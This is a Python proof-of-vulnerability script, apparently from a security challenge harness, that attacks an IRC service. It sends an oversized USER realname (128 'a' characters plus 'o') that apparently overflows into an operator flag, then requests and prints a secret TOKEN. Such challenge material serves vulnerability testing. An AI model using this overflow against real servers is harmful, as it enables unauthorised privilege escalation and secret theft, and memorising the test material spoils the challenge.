import sys
from pwn import *

def handler( signum, frame):
    print('[FAIL] sigalrm fired so the POV was likely unsuccessful')
    exit(0)

def randomstring(l):
    q = ''

    for _ in range(l):
        q += random.choice(string.ascii_lowercase)

    return q

def connect( ip, port ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect( (ip, port) )
    except:
        print('Failed to connect to %s:%d' %(ip, port))
        sys.exit(1)

    return s

def RU( s, u ):
    z = ''

    try:
        while z.endswith( u ) == False:
            z += s.recv(1).decode('utf-8')
    except Exception as e:
        print('Failed to receive data')
        print(e)
        return None

    return z

def RL( s ):
    return RU( s, '\n')

def SW(s, data):
    #print data
    s.sendall(data)

def main():
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)

    p_bob = remote(HOST, 6667)
   
    print('[INFO] Connecting with bob')

    p_bob.send('NICK bob\n')
    p_bob.send('USER bob yolodog aaaaaaaachess :' + 'a'*128 + 'o' + '\n')
    p_bob.readuntil('MOTD file is missing\r\n')
    p_bob.send('TOKEN\n')
    y = p_bob.readline().rstrip()

    if y.find(b'TOKEN') == -1:
        print('[FAIL] POV Failed')
        p_bob.close()
        return
    
    token = y.split(b':')[2]
    print('[TOKEN] %s' %(token))
    p_bob.close()
    
    print('[SUCCESS] POV Succeeded')

if __name__ == '__main__':
    main()
